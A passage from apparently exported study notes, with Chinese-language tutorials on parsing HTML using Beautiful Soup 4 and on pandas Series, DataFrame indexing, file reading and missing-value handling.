1.0), '')\n\tplt.show()\n\treturn\n\ncreate_plot(deci_tree)\n```"
  },
  {
    "title": "./notes/python库/bs4.md",
    "body": "# 简介\n和 lxml 一样，Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。\n\nlxml 只会局部遍历，而Beautiful Soup 是基于HTML DOM的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多，所以性能要低于lxml。\nBeautifulSoup 用来解析 HTML 比较简单，API非常人性化，支持[CSS选择器](http://www.w3school.com.cn/cssref/css_selectors.asp)、Python标准库中的HTML解析器，也支持 lxml 的 XML解析器。\nBeautiful Soup 3 目前已经停止开发，推荐现在的项目使用Beautiful Soup 4。使用 pip 安装即可：`pip install beautifulsoup4`\n\n官方文档：[http://beautifulsoup.readthedocs.io/zh_CN/v4.4.0](http://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/)\n\n| 抓取工具      | 速度 | 使用难度 | 安装难度   |\n| ------------- | ---- | -------- | ---------- |\n| 正则          | 最快 | 困难     | 无（内置） |\n| BeautifulSoup | 慢   | 最简单   | 简单       |\n| lxml          | 快   | 简单     | 一般       |\n\n**示例：**\n首先必须要导入 bs4 库\n```python\n# beautifulsoup4_test.py\n\nfrom bs4 import BeautifulSoup\n\nhtml = \"\"\"\n<html><head><title>The Dormouse's story</title></head>\n<body>\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a href=\"http://example.com/elsie\" class=\"sister\" id=\"link1\"><!-- Elsie --></a>,\n<a href=\"http://example.com/lacie\" class=\"sister\" id=\"link2\">Lacie</a> and\n<a href=\"http://example.com/tillie\" class=\"sister\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n<p class=\"story\">...</p>\n\"\"\"\n\n#创建 Beautiful Soup 对象\nsoup = BeautifulSoup(html)\n\n#打开本地 HTML 文件的方式来创建对象\n#soup = BeautifulSoup(open('index.html'))\n\n#格式化输出 soup 对象的内容\nprint soup.prettify()\n```\n\n运行结果：\n```\n<html>\n <head>\n  <title>\n   The Dormouse's story\n  </title>\n </head>\n <body>\n  <p class=\"title\" name=\"dromouse\">\n   <b>\n    The Dormouse's story\n   </b>\n  </p>\n  <p class=\"story\">\n   Once upon a time there were three little sisters; and their names were\n   <a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\">\n    <!-- Elsie -->\n   </a>\n   ,\n   <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">\n    Lacie\n   </a>\n   and\n   <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">\n    Tillie\n   </a>\n   ;\nand they lived at the bottom of a well.\n  </p>\n  <p class=\"story\">\n   ...\n  </p>\n </body>\n</html>\n```\n\n# 四大对象种类\nBeautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:\n- Tag\n- NavigableString\n- BeautifulSoup\n- Comment\n\n## Tag\nTag 通俗点讲就是 HTML 中的一个个标签，例如：\n```html\n<head><title>The Dormouse's story</title></head>\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n```\n上面的 `title` `head` `a` `p`等等 HTML 标签加上里面包括的内容就是 Tag，那么试着使用 Beautiful Soup 来获取 Tags:\n```python\nfrom bs4 import BeautifulSoup\n\nhtml = \"\"\"\n<html><head><title>The Dormouse's story</title></head>\n<body>\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a href=\"http://example.com/elsie\" class=\"sister\" id=\"link1\"><!-- Elsie --></a>,\n<a href=\"http://example.com/lacie\" class=\"sister\" id=\"link2\">Lacie</a> and\n<a href=\"http://example.com/tillie\" class=\"sister\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n<p class=\"story\">...</p>\n\"\"\"\n\n#创建 Beautiful Soup 对象\nsoup = BeautifulSoup(html)\n\nprint(soup.title)\n# <title>The Dormouse's story</title>\n\nprint(soup.head)\n# <head><title>The Dormouse's story</title></head>\n\nprint(soup.a)\n# <a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>\n\nprint(type(soup.p))\n# <class 'bs4.element.Tag'>\n```\n\n我们可以利用 soup 加标签名轻松地获取这些标签的内容，这些对象的类型是`bs4.element.Tag`。但是注意，它查找的是在所有内容中的第一个符合要求的标签。如果要查询所有的标签，后面会进行介绍。\n\n对于 Tag，它有两个重要的属性，是 name 和 attrs\n```python\nprint(soup.name)\n# [document] #soup 对象本身比较特殊，它的 name 即为 [document]\n\nprint(soup.head.name)\n# head #对于其他内部标签，输出的值便为标签本身的名称\n\nprint(soup.p.attrs)\n# {'class': ['title'], 'name': 'dromouse'}\n# 在这里，我们把 p 标签的所有属性打印输出了出来，得到的类型是一个字典。\n\nprint(soup.p['class']) # soup.p.get('class')\n# ['title'] #还可以利用get方法，传入属性的名称，二者是等价的\n\nsoup.p['class'] = \"newClass\"\nprint(soup.p) # 可以对这些属性和内容等等进行修改\n# <p class=\"newClass\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n\ndel soup.p['class'] # 还可以对这个属性进行删除\nprint(soup.p)\n# <p name=\"dromouse\"><b>The Dormouse's story</b></p>\n```\n\n## NavigableString\n既然我们已经得到了标签的内容，那么问题来了，我们要想获取标签内部的文字怎么办呢？很简单，用 .string 即可，例如\n```python\nprint(soup.p.string)\n# The Dormouse's story\n\nprint(type(soup.p.string))\n# In [13]: <class 'bs4.element.NavigableString'>\n```\n\n## BeautifulSoup\nBeautifulSoup 对象表示的是一个文档的内容。大部分时候,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性来感受一下\n```python\nprint type(soup.name)\n# <type 'unicode'>\n\nprint(soup.name)\n# [document]\n\nprint(soup.attrs)# 文档本身的属性为空\n# {}\n```\n\n## Comment\nComment 对象是一个特殊类型的 NavigableString 对象，其输出的内容不包括注释符号。\n```python\nprint(soup.a)\n# <a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>\n\nprint(soup.a.string)\n# Elsie \n\nprint(type(soup.a.string))\n# <class 'bs4.element.Comment'>\n```\n\na 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容时，注释符号已经去掉了。\n\n# 遍历文档树\n## 直接子节点\n### .contents\ntag 的`.contents`属性可以将tag的子节点以列表的方式输出\n```python\nprint(soup.head.contents)\n#[<title>The Dormouse's story</title>]\n```\n输出方式为列表，我们可以用列表索引来获取它的某一个元素\n```python\nprint(soup.head.contents[0])\n#<title>The Dormouse's story</title>\n```\n\n### .children\n它返回的不是一个 list，不过我们可以通过遍历获取所有子节点。\n我们打印输出`.children`看一下，可以发现它是一个 list 生成器对象\n```python\nprint(soup.head.children)\n#<listiterator object at 0x7f71457f5710>\n\nfor child in soup.body.children:\n    print(child)\n```\n\n结果:\n```html\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>,\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a> and\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n\n<p class=\"story\">...</p>\n```\n\n## 所有子孙节点\n.contents 和 .children 属性仅包含tag的直接子节点，.descendants 属性可以对所有tag的子孙节点进行递归循环，和 children类似，我们也需要遍历获取其中的内容。\n```python\nfor child in soup.descendants:\n    print(child)\n```\n\n运行结果：\n```python\n<html><head><title>The Dormouse's story</title></head>\n<body>\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>,\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a> and\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n<p class=\"story\">...</p>\n</body></html>\n<head><title>The Dormouse's story</title></head>\n<title>The Dormouse's story</title>\nThe Dormouse's story\n\n\n<body>\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>,\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a> and\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n<p class=\"story\">...</p>\n</body>\n\n\n<p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n<b>The Dormouse's story</b>\nThe Dormouse's story\n\n\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>,\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a> and\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\nOnce upon a time there were three little sisters; and their names were\n\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>\n Elsie \n,\n\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>\nLacie\n and\n\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>\nTillie\n;\nand they lived at the bottom of a well.\n\n\n<p class=\"story\">...</p>\n...\n```\n\n## 节点内容\n如果tag只有一个 NavigableString 类型子节点,那么这个tag可以使用 .string 得到子节点。如果一个tag仅有一个子节点,那么这个tag也可以使用 .string 方法,输出结果与当前唯一子节点的 .string 结果相同。\n\n通俗点说就是：如果一个标签里面没有标签了，那么 .string 就会返回标签里面的内容。如果标签里面只有唯一的一个标签了，那么 .string 也会返回最里面的内容。例如：\n```python\nprint(soup.head.string)\n#The Dormouse's story\nprint(soup.title.string)\n#The Dormouse's story\n```\n\n## 多个节点内容\n如果tag包含多个子节点，我们可以调用.strings和.stripped_strings来遍历获取\n\n### .strings\n```shell\n>>> print(soup.body)\n<body>\n<p class=\"title\"><b>The Dormouse's story</b></p>\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\">Elsie</a>,\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a> and\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n<p class=\"story\">...</p>\n</body>\n\n>>> print(soup.body.strings)\n<generator object _all_strings at 0x0000019C52E4F938>#输出的是一个List生成器\n\n>>> for child in soup.body.strings:##遍历获取\n>>>     print(child)\nThe Dormouse's story\n\n\nOnce upon a time there were three little sisters; and their names were\n\nElsie\n,\n\nLacie\n and\n\nTillie\n;\nand they lived at the bottom of a well.\n\n\n...\n```\n\n### .stripped_strings\n输出的字符串中可能包含了很多空格或空行，使用.stripped_strings可以去除多余空白内容\n```text\n>>> for child in soup.body.stripped_strings:\n>>>     print(child)\nThe Dormouse's story\nOnce upon a time there were three little sisters; and their names were\nElsie\n,\nLacie\nand\nTillie\n;\nand they lived at the bottom of a well.\n...\n```\n\n## 父节点\n.parent属性\n```text\n>>> print(soup.p)\n<p class=\"title\"><b>The Dormouse's story</b></p>\n\n>>> print(soup.p.parent.name)\nbody\n```\n\n通过元素的.parents属性可以递归得到元素的所有父辈节点，例如：\n```shell\n>>> for parent in soup.head.title.string.parents:\n>>>    print(parent.name)\ntitle\nhead\nhtml\n[document]\n```\n\n## 兄弟节点\n.next_sibling和.previous_sibling属性\n兄弟节点可以理解为和本节点处在同一级的节点，.next_sibling 属性获取了该节点的下一个兄弟节点，.previous_sibling 则与之相反，如果节点不存在，则返回 None\n注意：实际文档中的tag的 .next_sibling 和 .previous_sibling 属性通常是字符串或空白，因为空白或者换行也可以被视作一个节点，所以得到的结果可能是 空白或者换行。\n```shell\n>>> print(soup.p)\n<p class=\"title\"><b>The Dormouse's story</b></p>\n\n>>> print(soup.p.next_sibling)\n           #此处输出的为空白\n\n>>> print(soup.p.previous_sibling)\n           #此处输入的为空白\n\n>>> print(soup.p.next_sibling.next_sibling)\n<p class=\"story\">Once upon a time there were three little sisters; and their names were\n<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\">Elsie</a>,\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a> and\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>;\nand they lived at the bottom of a well.</p>\n```\n\n## 全部兄弟节点\n.next_siblings和.previous_siblings\n通过.next_siblings和.previous_siblings属性可以对当前节点的兄弟节点迭代输出。\n```shell\n>>> for sibling in soup.a.next_siblings:\n>>>     print(sibling)\n,\n\n<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>\n and\n\n<a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>\n;\nand they lived at the bottom of a well.\n```\n\n## 所有前后节点\n.next_elements和.previous_elements\n通过.next_elements和.previous_elements的迭代器就可以向前或向后访问文档的解析内容。\n\n# 搜索文档树\n## find_all\n`find_all(name, attrs, recursive, text, **kwargs)`\n### name 参数\nname 参数可以查找所有名字为 name 的tag,字符串对象会被自动忽略掉\n**1. 传字符串**\n最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的`<b>`标签:\n```python\nsoup.find_all('b')\n# [<b>The Dormouse's story</b>]\n\nprint soup.find_all('a')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>, <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>, <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>]\n```\n\n**2. 传正则表达式**\n如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 match() 来匹配内容.下面例子中找出所有以b开头的标签,这表示`<body>`和`<b>`标签都应该被找到\n```python\nimport re\nfor tag in soup.find_all(re.compile(\"^b\")):\n    print(tag.name)\n# body\n# b\n```\n\n**3. 传列表**\n如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有`<a>`标签和`<b>`标签:\n```python\nsoup.find_all([\"a\", \"b\"])\n# [<b>The Dormouse's story</b>,\n#  <a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\">Elsie</a>,\n#  <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>,\n#  <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>]\n```\n\n### keyword 参数\n```python\nsoup.find_all(id='link2')\n# [<a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>]\n```\n\n### text 参数\n通过 text 参数可以搜搜文档中的字符串内容，与 name 参数的可选值一样, text 参数接受 字符串 , 正则表达式 , 列表\n```python\nsoup.find_all(text=\"Elsie\")\n# [u'Elsie']\n\nsoup.find_all(text=[\"Tillie\", \"Elsie\", \"Lacie\"])\n# [u'Elsie', u'Lacie', u'Tillie']\n\nsoup.find_all(text=re.compile(\"Dormouse\"))\n[u\"The Dormouse's story\", u\"The Dormouse's story\"]\n```\n\n### limit参数\nfind_all() 方法返回全部的搜索结构,如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 limit 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 limit 的限制时,就停止搜索返回结果.\n文档树中有3个tag符合搜索条件,但结果只返回了2个,因为我们限制了返回数量:\n```text\n>>>print(soup.find_all(\"a\", limit=2))\n# [<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\">Elsie</a>,\n#  <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>]\n```\n\n### attrs 参数\n```python\ntr = soup.find_all('tr', attrs={'class': 'ffff'})\n# 或\ntr1 = soup.find_all('tr', class_='ffff')\n```\n\n## find()方法与find_all方法的区别\n1.find：找到第一个满足条件的标签就返回。说白了，就是只会返回一个元素。\n2.find_all：将所有满足条件的标签都返回。说白了，会返回很多标签（以列表的形式）\n\n## select\n这就是另一种与 find_all 方法有异曲同工之妙的查找方法.\n- 写 CSS 时，标签名不加任何修饰，类名前加`.`，id名前加`#`\n- 在这里我们也可以利用类似的方法来筛选元素，用到的方法是 `soup.select()`，返回类型是 `list`\n\n### 通过标签名查找\n```python\nprint soup.select('title') \n#[<title>The Dormouse's story</title>]\n\nprint soup.select('a')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>, <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>, <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>]\n\nprint soup.select('b')\n#[<b>The Dormouse's story</b>]\n```\n\n### 通过类名查找\n```python\nprint soup.select('.sister')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>, <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>, <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>]\n```\n\n### 通过 id 名查找\n```python\nprint soup.select('#link1')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>]\n```\n\n### 组合查找\n组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开\n```python\nprint soup.select('p #link1')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>]\n```\n\n直接子标签查找，则使用 `>` 分隔\n```python\nprint soup.select(\"head > title\")\n#[<title>The Dormouse's story</title>]\n```\n\n### 属性查找\n查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。\n```python\nprint soup.select('a[class=\"sister\"]')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>, <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\">Lacie</a>, <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\">Tillie</a>]\n\nprint soup.select('a[href=\"http://example.com/elsie\"]')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>]\n```\n同样，属性仍然可以与上述查找方式组合，不在同一节点的空格隔开，同一节点的不加空格\n```python\nprint soup.select('p a[href=\"http://example.com/elsie\"]')\n#[<a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"><!-- Elsie --></a>]\n```\n\n### 获取内容\n以上的 select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容。\n```python\nsoup = BeautifulSoup(html, 'lxml')\nprint type(soup.select('title'))\nprint soup.select('title')[0].get_text()\n\nfor title in soup.select('title'):\n    print title.get_text()\n```"
  },
  {
    "title": "./notes/python库/pandas.md",
    "body": "# 为什么要学习pandas\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022202922.png\"/>\n\n# pandas的常用数据类型\n1. Series 一维， 带标签数组 \n2. DataFrame 二维， Series容器\n# Series\n## Series创建\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022203915.png\"/>\n\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022204025.png\"/>\n\n对于Series，可以使用list（）来将其转变成list，  而对于DataFrame， 使用list()得到的是列名形成的列表\n\n## Series切片和索引\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022204410.png\"/>\n\n## Series的索引和值\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022204809.png\"/>\n\n<font color='red'>注： Series 类似于 一位数组， 一行多列， 但是没有columns方法</font>\n列如：\n```python\nprint(t)\n# Out\n# 0    yes\n# 1    yes\n# 2     no\n# 3     no\n# 4     no\n\nprint(type(t))\n# Out\n# <class 'pandas.core.series.Series'>\n\nprint(t.shape)\n# Out\n# (5,)\n\n```\n## value_counts()\npandas 的value_counts()函数可以对Series里面的每个值进行计数并且排序。\n返回类型为Series\n现有一个DataFrame\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025200520.png\">\n\n如果我们想知道，每个区域出现了多少次，可以简单如下：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025200540.png\">\n\n每个区域都被计数，并且默认从最高到最低做降序排列。\n\n如果想用升序排列，可以加参数ascending=True：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025200557.png\">\n\n如果想得出的计数占比，可以加参数normalize=True：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025200614.png\">\n\n空值是默认剔除掉的。value_counts()返回的结果是一个Series数组，可以跟别的数组进行运算。\n\nvalue_count()跟透视表里（pandas或者excel）的计数很相似，都是返回一组唯一值，并进行计数。这样能快速找出重复出现的值。\n\n\n\n# 读取外部文件\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022205552.png\"/>\nPandas的读取数据和文件的函数\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025123314.png\"/>\n\n## 常用函数\nread_csv() 读取以‘，’分割的文件到DataFrame\nread_table()读取以‘/t’分割的文件到DataFrame\n实质上是通用的，在实际使用中可以通过对sep参数的控制来对任何文本文件读取。\n1.参数说明\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025123438.png\"/>\n\n2.实例：\n文本内容为：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025123517.png\"/> \n\n1）该文本中的分割符既有空格又有制表符（‘/t’），sep参数用‘/s+’，可以匹配任何空格。\n代码如下：\n```pyton\nimport pandas as pd\ndf_txt = pd.read_csv('BSEP_NMC_ATME_SOB_EAQI_ACHN_LNO_P9_20160101060000000.TXT',sep='\\s+')\nprint df_txt\n```\n结果：\n```\n                                            diamond\n98286 31 102 34  1 20  34   0.217 6  41 21       19\n98249 31 102 23  1 12  23   0.496 17 29 18        3\n98204 31 102 43  1 16  43   0.162 29 19 14        2\n98138 41 80  119 3 90  9999 3.864 73 7  12       21\n98105 41 80  206 5 156 160  4.388 81 40 40       26\n98067 38 105 36  1 25  9999 0.822 14 40 40       31\n98025 38 105 26  1 18  26   0.879 16 75 75       27\n99980 38 105 24  1 13  17   0.199 4  76 77       22\n98502 47 88  29  1 4   10   2.637 3  90 88        3\n```\n（2）为行和列添加索引\n用参数names添加列索引，用index_col添加行索引\n```python\nimport pandas as pd\ndf_txt = pd.read_csv('BSEP_NMC_ATME_SOB_EAQI_ACHN_LNO_P9_20160101060000000.TXT',sep='\\s+',\n                     names=['1','2','3','4','5','6','7','8','9','10','11'],index_col=0)\nprint df_txt\n```\n结果如下：\n```\n            2      3      4    5      6       7      8     9    10    11\n1                                                                       \ndiamond   NaN    NaN    NaN  NaN    NaN     NaN    NaN   NaN   NaN   NaN\n98286    31.0  102.0   34.0  1.0   20.0    34.0  0.217   6.0  41.0  21.0\n98249    31.0  102.0   23.0  1.0   12.0    23.0  0.496  17.0  29.0  18.0\n98204    31.0  102.0   43.0  1.0   16.0    43.0  0.162  29.0  19.0  14.0\n98138    41.0   80.0  119.0  3.0   90.0  9999.0  3.864  73.0   7.0  12.0\n98105    41.0   80.0  206.0  5.0  156.0   160.0  4.388  81.0  40.0  40.0\n98067    38.0  105.0   36.0  1.0   25.0  9999.0  0.822  14.0  40.0  40.0\n98025    38.0  105.0   26.0  1.0   18.0    26.0  0.879  16.0  75.0  75.0\n99980    38.0  105.0   24.0  1.0   13.0    17.0  0.199   4.0  76.0  77.0\n98502    47.0   88.0   29.0  1.0    4.0    10.0  2.637   3.0  90.0  88.0\n```\n（3）我们不想要diamond那一行，可以用header来控制\n代码如下：\n```python\nimport pandas as pd\ndf_txt = pd.read_csv('BSEP_NMC_ATME_SOB_EAQI_ACHN_LNO_P9_20160101060000000.TXT',sep='\\s+',\n                     names=['1','2','3','4','5','6','7','8','9','10','11'],index_col=0,header=1)\nprint df_txt\n```\n结果如下：\n```\n        1    2    3  4    5     6      7   8   9  10  11\n98249  31  102   23  1   12    23  0.496  17  29  18   3\n98204  31  102   43  1   16    43  0.162  29  19  14   2\n98138  41   80  119  3   90  9999  3.864  73   7  12  21\n98105  41   80  206  5  156   160  4.388  81  40  40  26\n98067  38  105   36  1   25  9999  0.822  14  40  40  31\n98025  38  105   26  1   18    26  0.879  16  75  75  27\n99980  38  105   24  1   13    17  0.199   4  76  77  22\n98502  47   88   29  1    4    10  2.637   3  90  88   3\n```\n# DataFrame\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023083745.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023082113.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023083858.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023085344.png\"/>\n\n```python\n# sort function\ndf.sort_values(by=\"Column_name\", ascending=False)\n```\n\n## pandas之取行或者列\nIf the value in the square bracket conforms to the slice syntax, then it means the rows are picked and manipulated. Note, the value must conform to the slice syntax, otherwise an error will be reported.\nIf the value in the square bracket is string type and don't conform to the slice syntax, then it mean the columns are picked and manipulated. If you want to pick incontinuous columns, you must use the list containing these columns' names that you want to pick.\nFor example:\n```python\nprint(t1)\n#Out\n#    W  X   Y   Z\n# a  0  1   2   3\n# b  4  5   6   7\n# c  8  9  10  11\n\nprint(t1[1])\n#Out\n# KeyError: 1\n# Because it don't conform to the slice syntax.\n\nprint(t1[1:3])\n#Out\n#   W  X   Y   Z\n# b  4  5   6   7\n# c  8  9  10  11\n\nprint(t1[\"b\":\"c\"])\n#Out\n#    W  X   Y   Z\n# b  4  5   6   7\n# c  8  9  10  11\n\nprint(t1[\"W\"])\n#Out\n# a    0\n# b    4\n# c    8\n\nprint(t1[[\"W\", \"Y\"]])\n#Out\n#    W   Z\n# a  0   3\n# b  4   7\n# c  8  11\n\n```\n## 增加一行，一列\n优雅的增加一行，一定要优雅！\n```pyton\ndf=DataFrame(np.arange(16).reshape((4,4)),index=['a','b','c','d'],columns=['one','two','three','four'])  \n\ndf.loc['new_raw'] = '3'\n# 不要使用iloc, 否则会报错\ndf\nOut[84]: \n        one two three four\na         0   1     2    3\nb         4   5     6    7\nc         8   9    10   11\nd        12  13    14   15\nnew_raw   3   3     3    3\n```\n\n优雅的增加一列，一定要优雅！\n```python\ndf['new_colu']='12'#向 DataFrame 添加一列，该列为同一值\ndf\nOut[93]: \n        one two three four new_colu\na         0   1     2    3       12\nb         4   5     6    7       12\nc         8   9    10   11       12\nd        12  13    14   15       12\nnew_raw   3   3     3    3       12\n```\n# pandas之loc与iloc\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023164036.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023165131.png\"/>\n\n# pandas之布尔索引\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023165506.png\"/>\n\n<font color='red'>布尔索引一定要与loc使用，不能与iloc使用</font>\n\n# pandas之字符串方法\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023165626.png\"/>\n\n# drop函数\n用法：DataFrame.drop(labels=None,axis=0, index=None, columns=None, inplace=False)\n\n参数说明：\nlabels 就是要删除的行列的名字，用列表给定\naxis 默认为0，指删除行，因此删除columns时要指定axis=1；\nindex 直接指定要删除的行\ncolumns 直接指定要删除的列\ninplace=False，默认该删除操作不改变原数据，而是返回一个执行删除操作后的新dataframe；\ninplace=True，则会直接在原数据上进行删除操作，删除后无法返回。\n\n```python\nframe.drop(['Ohio'], axis = 1)\n```\n# 错误数据的处理\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023170045.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191023171343.png\"/>\nThe how paramter has two values, any and all respectively. 'Any' represents to delete these rows containing Nan value. 'All' represents to delete these rows with all elements are Nan value. And the default is 'Any'.\nThe inplace paramter expresses whether modify the value in original object.\nNote: The fillna function also has the inplace paramter. And the default value of inplace is False.\n```python\nprint(t1)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  NaN   6   7\n# c  8  9.0  10  11\n\na = t1.dropna(axis=0, how=\"all\", inplace=False)\nprint(a)\n#Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  NaN   6   7\n# c  8  9.0  10  11\n\na = t1.dropna(axis=0, how=\"any\", inplace=False)\nprint(a)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# c  8  9.0  10  11\n\nprint(t1)\n#Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  NaN   6   7\n# c  8  9.0  10  11\n# Thus it can be seen that when the inplace is Flase the t1 don't change.\n\nt1.dropna(axis=0, how=\"any\", inplace=True)\nprint(t1)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# c  8  9.0  10  11\n\n```\n\n```python\nprint(t1)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  